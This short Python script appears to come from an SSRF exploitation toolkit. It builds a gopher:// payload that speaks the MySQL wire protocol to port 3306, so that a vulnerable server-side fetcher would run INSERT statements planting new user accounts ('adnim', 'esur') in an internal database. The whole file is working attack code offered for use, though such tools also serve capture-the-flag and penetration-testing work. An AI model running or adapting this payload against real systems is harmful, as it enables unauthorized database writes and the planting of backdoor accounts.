from gopher import to_gopher_payload
from db import mysql

if __name__ == "__main__":
    mysql = mysql.MySQL(
        user="test",
        database="test",
        queries=[
            "INSERT INTO users (username, password) VALUES ('adnim','adnim');",
            "INSERT INTO users (username, password) VALUES ('esur','esur');",
        ],
    )
    gopher_payload = to_gopher_payload(b"3306", mysql.gen_tcp_payload())
    print(gopher_payload)
